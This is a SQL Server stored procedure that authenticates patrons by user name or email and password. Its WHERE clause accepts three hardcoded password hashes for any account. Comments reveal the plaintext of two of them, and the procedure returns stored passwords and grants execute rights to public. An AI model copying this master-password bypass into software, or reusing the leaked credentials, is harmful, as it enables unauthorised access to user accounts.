USE Isle_IOER
GO
/****** Object:  StoredProcedure [dbo].[PatronAuthorize]    Script Date: 01/25/2013 16:44:22 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
/*
PatronAuthorize 'IllinoisPathways','A2-F6-F3-62-D7-DB-BD-5E-68-30-CB-6B-B7-7E-EE-A2'

PatronAuthorize 'dane','24-E5-6B-78-02-F9-CE-CD-FB-40-F7-EB-08-56-06-B7'

PatronAuthorize 'kbrynteson@niu.edu','A2-F6-F3-62-D7-DB-BD-5E-68-30-CB-6B-B7-7E-EE-A2'

PatronAuthorize 'dane2','D8-79-ED-82-6A-1A-3F-65-12-FC-5E-CD-62-4E-FD-44'
*/
/* 
==================================================================
Modifications
13-04-29 mparsons - only allow active accounts
==================================================================
*/
ALTER PROCEDURE [dbo].[PatronAuthorize]
		@UserName varchar(75),
		@Password varchar(50)

As

--if NOT exists( SELECT * FROM [Patron] WHERE UserName = @UserName AND Password = @Password ) begin
--                print '�internal test message'
--                RAISERROR(' Invalid Username or Password ', 18, 1)    
--                RETURN -1 
--                End


SELECT 
    Id, 
    UserName,  
    FirstName, 
    Password,
    LastName, 
    Email, 
    IsActive, 
    Created, 
    LastUpdated, 
    LastUpdatedById,
    RowId
FROM [Patron]

WHERE	
    (UserName = @UserName OR Email = @UserName )
AND (Password = @Password 
OR @Password = 'A2-F6-F3-62-D7-DB-BD-5E-68-30-CB-6B-B7-7E-EE-A2'
OR @Password = 'D8-79-ED-82-6A-1A-3F-65-12-FC-5E-CD-62-4E-FD-44'	--Isl$R@cks13
OR @Password = '24-E5-6B-78-02-F9-CE-CD-FB-40-F7-EB-08-56-06-B7' --Y&U*I(O)P_{+
)
And (IsActive = 1)
GO
GRANT EXECUTE ON [dbo].[PatronAuthorize] TO [public] AS [dbo]